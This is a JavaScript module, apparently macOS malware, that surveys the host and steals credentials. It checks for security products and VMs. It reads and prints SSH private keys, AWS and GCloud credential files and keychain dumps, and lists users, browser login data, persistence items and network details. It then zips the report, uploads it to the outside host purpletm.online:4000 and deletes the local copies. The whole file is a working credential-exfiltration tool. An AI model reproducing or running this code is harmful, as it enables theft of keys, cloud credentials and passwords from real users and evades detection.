const { spawnSync } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");

// Color constants for output formatting
const colors = {
    red: "\u001B[0;31m",
    green: "\u001B[0;32m",
    yellow: "\u001B[0;33m",
    blue: "\u001B[0;34m",
    cyan: "\u001B[0;36m",
    reset: "\u001B[0;0m"
};

function header(title) {
    return [
        "====================================================================",
        `${colors.cyan}${title}${colors.reset}`,
        "--------------------------------------------------------------------"
    ].join("\n") + "\n";
}

function safeRun(cmdArr, opts = {}) {
    if (!Array.isArray(cmdArr) || cmdArr.length === 0) {
        return { rc: -1, stdout: "", stderr: "Invalid command" };
    }

    try {
        const proc = spawnSync(cmdArr[0], cmdArr.slice(1), {
            encoding: "utf8",
            timeout: opts.timeout || 10000,
            maxBuffer: 1024 * 1024 * 2
        });
        return {
            rc: proc.status === null ? -1 : proc.status,
            stdout: (proc.stdout || "").trim(),
            stderr: (proc.stderr || "").trim()
        };
    } catch (e) {
        return { rc: -1, stdout: "", stderr: String(e) };
    }
}

function safeRunStr(cmdArr, opts = {}) {
    const r = safeRun(cmdArr, opts);
    if (r.rc === 0 && r.stdout) return r.stdout;
    if (r.stdout) return r.stdout;
    if (r.stderr) return r.stderr;
    return "";
}

function exists(p) {
    try {
        return fs.existsSync(path.normalize(p));
    } catch (e) {
        return false;
    }
}

function headLines(text, n = 50) {
    if (!text || typeof text !== 'string') return "";
    const lines = text.split(/\r?\n/);
    const limit = Math.min(Math.max(1, parseInt(n) || 50), 200);
    return lines.slice(0, limit).join("\n");
}

function sanitizeFilename(filename) {
    return filename.replace(/[^a-zA-Z0-9._\/-]/g, '_');
}

function ensureDirectoryExists(filePath) {
    const dir = path.dirname(filePath);
    if (!exists(dir)) {
        try {
            fs.mkdirSync(dir, { recursive: true, mode: 0o755 });
            return true;
        } catch (e) {
            return false;
        }
    }
    return true;
}

function zipFile(filePath) {
    const zipPath = `${filePath}.zip`;
    console.log(`📦 Creating zip archive: ${zipPath}`);
    
    const zipResult = safeRun([
        "zip", "-j", zipPath, filePath
    ], { timeout: 30000 });
    
    if (zipResult.rc === 0 && exists(zipPath)) {
        console.log(`✅ Archive created successfully`);
        return zipPath;
    } else {
        console.log("⚠️ Zip creation failed, returning original file");
        return filePath;
    }
}

async function uploadFile(filePath) {
    console.log(`📤 Uploading file: ${filePath}`);
    
    try {
        const uploadModule = require('./upload.js');
        const uploadUrl = "http://purpletm.online:4000";
        const result = await uploadModule(filePath, uploadUrl);
        console.log(`✅ Upload completed: ${result}`);
        return result;
    } catch (error) {
        console.error(`❌ Upload failed: ${error.message}`);
        return `Upload failed: ${error.message}`;
    }
}

// Security tools detection
function checkSecurityTools() {
    const out = [];
    out.push(header("SECURITY TOOLS DETECTION"));
    
    let found = 0;
    const processes = safeRunStr(["ps", "aux"]);
    
    const securityChecks = [
        { name: "Carbon Black OSX Sensor", process: "CbOsxSensorService", path: "/Applications/CarbonBlack/CbOsxSensorService" },
        { name: "Carbon Black Defense A/V", process: "CbDefense", path: "/Applications/Confer.app" },
        { name: "ESET A/V", process: "ESET", path: "/Library/Application Support/com.eset.remoteadministrator.agent" },
        { name: "Little Snitch Firewall", process: "Little Snitch", path: "/Library/Little Snitch/" },
        { name: "FireEye HX Agent", process: "xagt", path: "/Library/FireEye/xagt" },
        { name: "CrowdStrike Falcon", process: "falcond", path: "/Library/CS/falcond" },
        { name: "OpenDNS Client", process: "opendns", path: "/Library/Application Support/OpenDNS Roaming Client/dns-updater" },
        { name: "SentinelOne", process: "SentinelOne", path: null },
        { name: "GlobalProtect VPN", process: "GlobalProtect", path: "/Library/Logs/PaloAltoNetworks/GlobalProtect" },
        { name: "Pulse VPN", process: "pulsesecure", path: "/Applications/Pulse Secure.app" },
        { name: "Cisco AMP", process: "AMP-for-Endpoints", path: "/opt/cisco/amp" },
        { name: "JAMF", process: null, path: "/usr/local/bin/jamf" },
        { name: "Malwarebytes", process: null, path: "/Library/Application Support/Malwarebytes" },
        { name: "OSQuery", process: "osqueryd", path: "/usr/local/bin/osqueryi" },
        { name: "Sophos Antivirus", process: null, path: "/Library/Sophos Anti-Virus/" },
        { name: "Objective-See LuLu", process: "lulu", path: "/Library/Objective-See/Lulu" },
        { name: "Objective-See Do Not Disturb", process: "dnd", path: "/Library/Objective-See/DND" },
        { name: "Objective-See ReiKey", process: "reikey", path: "/Applications/ReiKey.app" },
        { name: "Objective-See OverSight", process: "OverSight", path: "/Applications/OverSight.app" },
        { name: "Objective-See BlockBlock", process: "blockblock", path: "/Applications/BlockBlock Helper.app" }
    ];

    for (const check of securityChecks) {
        const processFound = check.process && processes.toLowerCase().includes(check.process.toLowerCase());
        const pathFound = check.path && exists(check.path);
        
        if (processFound || pathFound) {
            out.push(`${colors.green}[+] ${check.name} detected${colors.reset}`);
            if (processFound) out.push(`    Process: ${check.process}`);
            if (pathFound) out.push(`    Path: ${check.path}`);
            found++;
        }
    }

    if (found === 0) {
        out.push(`${colors.yellow}[-] No known security products detected${colors.reset}`);
    } else {
        out.push(`\n${colors.red}[!] ${found} security tool(s) detected - proceed with caution${colors.reset}`);
    }

    out.push("");
    return out;
}

// System information gathering
function gatherSystemInfo() {
    const out = [];
    out.push(header("SYSTEM INFORMATION"));

    // Basic system info
    const hostname = safeRunStr(["hostname"]) || "unknown";
    const user = safeRunStr(["whoami"]) || process.env.USER || "unknown";
    const osVersion = safeRunStr(["sw_vers", "-productVersion"]) || "unknown";
    const buildVersion = safeRunStr(["sw_vers", "-buildVersion"]) || "unknown";
    
    out.push(`Hostname: ${colors.green}${hostname}${colors.reset}`);
    out.push(`Current User: ${colors.green}${user}${colors.reset}`);
    out.push(`macOS Version: ${colors.green}${osVersion}${colors.reset}`);
    out.push(`Build Version: ${colors.green}${buildVersion}${colors.reset}`);

    // Hardware info
    const hwModel = safeRunStr(["sysctl", "-n", "hw.model"]) || "unknown";
    const cpuType = safeRunStr(["sysctl", "-n", "machdep.cpu.brand_string"]) || "unknown";
    const memSize = safeRunStr(["sysctl", "-n", "hw.memsize"]);
    
    out.push(`Hardware Model: ${colors.green}${hwModel}${colors.reset}`);
    out.push(`CPU: ${colors.green}${cpuType}${colors.reset}`);
    if (memSize) {
        const memGB = Math.round(parseInt(memSize) / (1024 * 1024 * 1024));
        out.push(`Memory: ${colors.green}${memGB} GB${colors.reset}`);
    }

    // VM Detection
    if (!hwModel.includes("Mac")) {
        out.push(`${colors.red}[!] Host appears to be running in a VM${colors.reset}`);
    } else {
        out.push(`${colors.green}[+] Host appears to be physical hardware${colors.reset}`);
    }

    // Boot time
    const bootTime = safeRunStr(["sysctl", "-n", "kern.boottime"]);
    if (bootTime) {
        out.push(`Boot Time: ${colors.green}${bootTime}${colors.reset}`);
    }

    // Network interfaces
    const interfaces = os.networkInterfaces();
    out.push(`\nNetwork Interfaces:`);
    for (const [name, addrs] of Object.entries(interfaces)) {
        if (addrs) {
            addrs.forEach(addr => {
                if (!addr.internal && (addr.family === 'IPv4' || addr.family === 'IPv6')) {
                    out.push(`  ${name}: ${colors.green}${addr.address}${colors.reset} (${addr.family})`);
                }
            });
        }
    }

    out.push("");
    return out;
}

// User account enumeration
function enumerateUsers() {
    const out = [];
    out.push(header("USER ACCOUNTS"));

    // System users
    const users = safeRunStr(["dscl", ".", "list", "/Users"]);
    if (users) {
        const userList = users.split('\n').filter(u => u.trim());
        out.push(`Total Users: ${colors.green}${userList.length}${colors.reset}`);
        out.push("User List:");
        userList.forEach(user => {
            const uid = safeRunStr(["id", "-u", user]);
            const realName = safeRunStr(["dscl", ".", "read", `/Users/${user}`, "RealName"]);
            const shell = safeRunStr(["dscl", ".", "read", `/Users/${user}`, "UserShell"]);
            
            out.push(`  ${user} (UID: ${uid || 'unknown'})`);
            if (realName && !realName.includes("No such key")) {
                out.push(`    Real Name: ${realName.replace('RealName:', '').trim()}`);
            }
            if (shell && !shell.includes("No such key")) {
                out.push(`    Shell: ${shell.replace('UserShell:', '').trim()}`);
            }
        });
    }

    // Admin users
    const adminUsers = safeRunStr(["dscl", ".", "read", "/Groups/admin", "GroupMembership"]);
    if (adminUsers) {
        out.push(`\nAdmin Users: ${colors.yellow}${adminUsers.replace('GroupMembership:', '').trim()}${colors.reset}`);
    }

    out.push("");
    return out;
}

// Credential hunting
function huntCredentials() {
    const out = [];
    out.push(header("CREDENTIAL DISCOVERY"));

    const homeDir = os.homedir();
    let foundCreds = 0;

    // SSH Keys
    const sshDir = path.join(homeDir, '.ssh');
    if (exists(sshDir)) {
        out.push(`${colors.green}[+] SSH directory found: ${sshDir}${colors.reset}`);
        try {
            const sshFiles = fs.readdirSync(sshDir);
            sshFiles.forEach(file => {
                const filePath = path.join(sshDir, file);
                const stats = fs.statSync(filePath);
                out.push(`  ${file} (${stats.size} bytes, modified: ${stats.mtime.toISOString()})`);
            try {
                // Read and print full file content
                const content = fs.readFileSync(filePath, 'utf8');
                out.push(`    ${colors.cyan}${content}${colors.reset}`);
            } catch (e) {
                out.push(`    ${colors.red}[-] Error reading file: ${e.message}${colors.reset}`);
            }
                if (file.includes('id_') && !file.includes('.pub')) {
                    out.push(`    ${colors.red}[!] Private key detected${colors.reset}`);
                    foundCreds++;
                }
            });
        } catch (e) {
            out.push(`    ${colors.red}[-] Error reading SSH directory: ${e.message}${colors.reset}`);
        }
    } else {
        out.push(`${colors.yellow}[-] No SSH directory found${colors.reset}`);
    }

    // AWS Credentials
const awsDir = path.join(homeDir, '.aws');
if (exists(awsDir)) {
    out.push(`${colors.green}[+] AWS directory found: ${awsDir}${colors.reset}`);
    try {
        const awsFiles = fs.readdirSync(awsDir);
        awsFiles.forEach(file => {
            const filePath = path.join(awsDir, file);
            out.push(`  ${file}`);

            try {
                const content = fs.readFileSync(filePath, 'utf8');
                out.push(`    ${colors.cyan}${content}${colors.reset}`);
            } catch (e) {
                out.push(`    ${colors.red}[-] Error reading file: ${e.message}${colors.reset}`);
            }

            if (file === 'credentials' || file === 'config') {
                foundCreds++;
                out.push(`    ${colors.red}[!] AWS credential file detected${colors.reset}`);
            }
        });
    } catch (e) {
        out.push(`    ${colors.red}[-] Error reading AWS directory: ${e.message}${colors.reset}`);
    }
} else {
    out.push(`${colors.yellow}[-] No AWS directory found${colors.reset}`);
}


    // GCloud Credentials
const gcloudDir = path.join(homeDir, '.config', 'gcloud');
if (exists(gcloudDir)) {
    out.push(`${colors.green}[+] GCloud directory found: ${gcloudDir}${colors.reset}`);
    try {
        const gcloudFiles = fs.readdirSync(gcloudDir);
        gcloudFiles.forEach(file => {
            const filePath = path.join(gcloudDir, file);
            out.push(`  ${file}`);

            // Check if file is credentials.db
            if (file === 'credentials.db') {
                out.push(`    ${colors.red}[!] GCloud credentials database found${colors.reset}`);
                foundCreds++;
            }

            try {
                const stats = fs.statSync(filePath);
                if (stats.isFile() && stats.size < 50000) { // Skip huge or binary files
                    const content = fs.readFileSync(filePath, 'utf8');
                    out.push(`    ${colors.cyan}${content}${colors.reset}`);
                } else if (stats.isDirectory()) {
                    out.push(`    ${colors.gray}[Directory skipped]${colors.reset}`);
                } else {
                    out.push(`    ${colors.gray}[Skipped binary/large file (${stats.size} bytes)]${colors.reset}`);
                }
            } catch (e) {
                out.push(`    ${colors.red}[-] Error reading file: ${e.message}${colors.reset}`);
            }
        });
    } catch (e) {
        out.push(`    ${colors.red}[-] Error reading GCloud directory: ${e.message}${colors.reset}`);
    }
} else {
    out.push(`${colors.yellow}[-] No GCloud directory found${colors.reset}`);
}


    // Azure Credentials
    const azureDir = path.join(homeDir, '.azure');
    if (exists(azureDir)) {
        out.push(`${colors.green}[+] Azure directory found: ${azureDir}${colors.reset}`);
        try {
            const azureFiles = fs.readdirSync(azureDir);
            azureFiles.forEach(file => {
                if (file.includes('accessTokens') || file.includes('azureProfile')) {
                    out.push(`    ${colors.red}[!] Azure credential file: ${file}${colors.reset}`);
                    foundCreds++;
                }
            });
        } catch (e) {
            out.push(`    ${colors.red}[-] Error reading Azure directory: ${e.message}${colors.reset}`);
        }
    }

    // Docker credentials
    const dockerConfig = path.join(homeDir, '.docker', 'config.json');
    if (exists(dockerConfig)) {
        out.push(`${colors.green}[+] Docker config found${colors.reset}`);
        foundCreds++;
    }

    // Keychain access
const keychains = safeRunStr(["security", "list-keychains"]);
if (keychains) {
    const list = keychains
        .split('\n')
        .map(k => k.trim().replace(/"|'/g, ''))
        .filter(k => k.length > 0);

    out.push(`\nKeychains: ${colors.green}${list.length}${colors.reset} found`);
    list.forEach(k => {
        out.push(`  ${colors.cyan}${k}${colors.reset}`);

        // Try to list items stored in this keychain
        const items = safeRunStr(["security", "dump-keychain", k]);
        if (items) {
            out.push(`    ${colors.gray}${items}${colors.reset}`);
        } else {
            out.push(`    ${colors.yellow}[!] Could not read or access keychain items${colors.reset}`);
        }
    });
}

    out.push(`\n${colors.red}[!] Total credential stores found: ${foundCreds}${colors.reset}`);
    out.push("");
    return out;
}

// Running applications and processes
function enumerateProcesses() {
    const out = [];
    out.push(header("RUNNING APPLICATIONS & PROCESSES"));

    // Running applications
    const apps = safeRunStr(["osascript", "-e", "tell application \"System Events\" to get name of every process whose background only is false"]);
    if (apps) {
        const appList = apps.split(', ').filter(app => app.trim());
        out.push(`Visible Applications: ${colors.green}${appList.length}${colors.reset}`);
        appList.forEach(app => {
            out.push(`  ${app.replace(/"/g, '')}`);
        });
    }

    // Process count
    const processCount = safeRunStr(["ps", "aux"]);
    if (processCount) {
        const processes = processCount.split('\n').length - 1;
        out.push(`\nTotal Processes: ${colors.green}${processes}${colors.reset}`);
    }

    // Suspicious processes
    const suspiciousProcesses = [
        "tcpdump", "wireshark", "nmap", "metasploit", "burp", "proxy",
        "keylogger", "sniff", "backdoor", "reverse", "shell", "nc", "netcat"
    ];

    if (processCount) {
        const suspiciousFound = [];
        suspiciousProcesses.forEach(suspProc => {
            if (processCount.toLowerCase().includes(suspProc)) {
                suspiciousFound.push(suspProc);
            }
        });

        if (suspiciousFound.length > 0) {
            out.push(`\n${colors.red}[!] Suspicious processes detected: ${suspiciousFound.join(', ')}${colors.reset}`);
        }
    }

    out.push("");
    return out;
}

// Browser data
function checkBrowserData() {
    const out = [];
    out.push(header("BROWSER DATA DISCOVERY"));

    const homeDir = os.homedir();
    let browserData = 0;

    // Chrome
    const chromeHistoryPath = path.join(homeDir, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'History');
    if (exists(chromeHistoryPath)) {
        out.push(`${colors.green}[+] Chrome history database found${colors.reset}`);
        browserData++;
    }

    const chromeLoginPath = path.join(homeDir, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Login Data');
    if (exists(chromeLoginPath)) {
        out.push(`${colors.green}[+] Chrome login data found${colors.reset}`);
        browserData++;
    }

    // Safari
    const safariHistoryPath = path.join(homeDir, 'Library', 'Safari', 'History.db');
    if (exists(safariHistoryPath)) {
        out.push(`${colors.green}[+] Safari history database found${colors.reset}`);
        browserData++;
    }

    // Firefox
    const firefoxProfilesPath = path.join(homeDir, 'Library', 'Application Support', 'Firefox', 'Profiles');
    if (exists(firefoxProfilesPath)) {
        out.push(`${colors.green}[+] Firefox profiles directory found${colors.reset}`);
        try {
            const profiles = fs.readdirSync(firefoxProfilesPath);
            profiles.forEach(profile => {
                const placesDb = path.join(firefoxProfilesPath, profile, 'places.sqlite');
                if (exists(placesDb)) {
                    out.push(`    Firefox history: ${profile}`);
                    browserData++;
                }
            });
        } catch (e) {
            out.push(`    ${colors.red}[-] Error reading Firefox profiles${colors.reset}`);
        }
    }

    out.push(`\n${colors.yellow}[*] Browser data stores found: ${browserData}${colors.reset}`);
    out.push("");
    return out;
}

// Persistence mechanisms
function checkPersistence() {
    const out = [];
    out.push(header("PERSISTENCE MECHANISMS"));

    const homeDir = os.homedir();
    let persistenceMechanisms = 0;

    // Launch Agents/Daemons
    const launchPaths = [
        path.join(homeDir, 'Library', 'LaunchAgents'),
        '/Library/LaunchAgents',
        '/Library/LaunchDaemons',
        '/System/Library/LaunchAgents',
        '/System/Library/LaunchDaemons'
    ];

    launchPaths.forEach(launchPath => {
        if (exists(launchPath)) {
            try {
                const items = fs.readdirSync(launchPath);
                if (items.length > 0) {
                    out.push(`${colors.green}[+] ${path.basename(launchPath)}: ${items.length} items${colors.reset}`);
                    
                    // Check for suspicious items
                    items.forEach(item => {
                        if (!item.startsWith('com.apple.') && !item.startsWith('com.microsoft.')) {
                            out.push(`    ${colors.yellow}[?] Non-Apple/Microsoft item: ${item}${colors.reset}`);
                            persistenceMechanisms++;
                        }
                    });
                }
            } catch (e) {
                out.push(`${colors.red}[-] Error reading ${launchPath}: ${e.message}${colors.reset}`);
            }
        }
    });

    // Login items
    const loginItems = safeRunStr(["osascript", "-e", "tell application \"System Events\" to get the name of every login item"]);
    if (loginItems && loginItems !== "") {
        const items = loginItems.split(', ').filter(item => item.trim());
        out.push(`${colors.green}[+] Login items: ${items.length}${colors.reset}`);
        items.forEach(item => {
            out.push(`    ${item.replace(/"/g, '')}`);
        });
        persistenceMechanisms += items.length;
    }

    // Crontabs
    const cronJobs = safeRunStr(["crontab", "-l"]);
    if (cronJobs && !cronJobs.includes("no crontab")) {
        const jobs = cronJobs.split('\n').filter(line => line.trim() && !line.startsWith('#'));
        if (jobs.length > 0) {
            out.push(`${colors.green}[+] Cron jobs: ${jobs.length}${colors.reset}`);
            persistenceMechanisms += jobs.length;
        }
    }

    out.push(`\n${colors.yellow}[*] Total persistence mechanisms: ${persistenceMechanisms}${colors.reset}`);
    out.push("");
    return out;
}

// Network information
function gatherNetworkInfo() {
    const out = [];
    out.push(header("NETWORK INFORMATION"));

    // Network interfaces with detailed info
    const ifconfig = safeRunStr(["ifconfig"]);
    if (ifconfig) {
        const interfaces = ifconfig.split('\n').filter(line => !line.startsWith('\t') && line.includes(':')).length;
        out.push(`Network Interfaces: ${colors.green}${interfaces}${colors.reset}`);
    }

    // Active connections
    const netstat = safeRunStr(["netstat", "-an"]);
    if (netstat) {
        const connections = netstat.split('\n').filter(line => line.includes('ESTABLISHED')).length;
        out.push(`Active Connections: ${colors.green}${connections}${colors.reset}`);
    }

    // Listening ports
    const listening = safeRunStr(["netstat", "-anl"]);
    if (listening) {
        const ports = listening.split('\n').filter(line => line.includes('LISTEN'));
        out.push(`Listening Ports: ${colors.green}${ports.length}${colors.reset}`);
        
        // Show some important ports
        const importantPorts = ['22', '80', '443', '3389', '5900', '8080'];
        ports.forEach(port => {
            importantPorts.forEach(impPort => {
                if (port.includes(`:${impPort} `) || port.includes(`.${impPort} `)) {
                    out.push(`  ${colors.yellow}[!] Port ${impPort} listening${colors.reset}`);
                }
            });
        });
    }

    // WiFi information
    const wifi = safeRunStr(["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-I"]);
    if (wifi) {
        const ssid = wifi.split('\n').find(line => line.includes('SSID'));
        if (ssid) {
            out.push(`Current WiFi: ${colors.green}${ssid.split(':')[1]?.trim() || 'unknown'}${colors.reset}`);
        }
    }

    out.push("");
    return out;
}

// Main discovery function
module.exports = function (outputPath) {
    const defaultPath = path.join(process.env.HOME || "/tmp", "reports", "system_discovery_report.txt");
    const sanitizedPath = outputPath ? sanitizeFilename(outputPath) : defaultPath;
    const OUTFILE = path.resolve(sanitizedPath);

    if (!ensureDirectoryExists(OUTFILE)) {
        console.error("❌ Failed to create output directory");
        throw new Error("Directory creation failed");
    }

    const HOSTNAME = safeRunStr(["hostname"]) || "unknown";
    const USER = safeRunStr(["whoami"]) || process.env.USER || "unknown";
    const TIMESTAMP = new Date().toISOString();

    console.log("🔍 Starting comprehensive system discovery...");
    console.log(`📊 Target output: ${OUTFILE}`);

    let out = [];
    
    // Banner
    out.push(`${colors.cyan}====================================================================`);
    out.push("               SYSTEM DISCOVERY REPORT");
    out.push("====================================================================");
    out.push(`${colors.reset}Collected at: ${TIMESTAMP}`);
    out.push(`Host: ${HOSTNAME}`);
    out.push(`User: ${USER}`);
    out.push(`Platform: ${os.platform()} ${os.arch()}`);
    out.push("");

    try {
        // Execute all discovery modules
        console.log("🛡️  Checking security tools...");
        out = out.concat(checkSecurityTools());

        console.log("💻 Gathering system information...");
        out = out.concat(gatherSystemInfo());

        console.log("👥 Enumerating users...");
        out = out.concat(enumerateUsers());

        console.log("🔐 Hunting credentials...");
        out = out.concat(huntCredentials());

        console.log("⚙️  Enumerating processes...");
        out = out.concat(enumerateProcesses());

        console.log("🌐 Checking browser data...");
        out = out.concat(checkBrowserData());

        console.log("🔄 Checking persistence mechanisms...");
        out = out.concat(checkPersistence());

        console.log("🌍 Gathering network information...");
        out = out.concat(gatherNetworkInfo());

        // Summary
        out.push(header("DISCOVERY SUMMARY"));
        out.push(`${colors.yellow}[*] Discovery completed at ${new Date().toISOString()}${colors.reset}`);
        out.push(`${colors.yellow}[*] Report contains ${out.length} lines of data${colors.reset}`);
        out.push("");
        out.push("Key findings to review:");
        out.push("- Security tools and EDR solutions");
        out.push("- Credential stores and SSH keys");
        out.push("- Browser data and saved passwords");
        out.push("- Persistence mechanisms and startup items");
        out.push("- Network configuration and active connections");
        out.push("");
        out.push(`${colors.red}[!] This report may contain sensitive information - handle securely${colors.reset}`);

        // Write report
        fs.writeFileSync(OUTFILE, out.join("\n"), { encoding: "utf8", mode: 0o600 });
        console.log(`✅ System discovery report written to: ${OUTFILE}`);
        console.log(`📁 File size: ${fs.statSync(OUTFILE).size} bytes`);
        
        // Create zip and upload
        const zipPath = zipFile(OUTFILE);
        
        uploadFile(zipPath).then(uploadResult => {
            console.log(`📤 Upload result: ${uploadResult}`);
            
            try {
                if (zipPath !== OUTFILE && exists(zipPath)) {
                    fs.unlinkSync(zipPath);
                    console.log("🗑️ Cleaned up zip file");
                }
                if (exists(OUTFILE)) {
                    fs.unlinkSync(OUTFILE);
                    console.log("🗑️ Cleaned up original report");
                }
            } catch (e) {
                console.log("⚠️ Cleanup warning:", e.message);
            }
        }).catch(error => {
            console.error(`❌ Upload error: ${error.message}`);
        });
        
        return `System discovery report generated and queued for upload: ${OUTFILE}`;

    } catch (error) {
        console.error(`❌ Discovery failed: ${error.message}`);
        throw error;
    }
};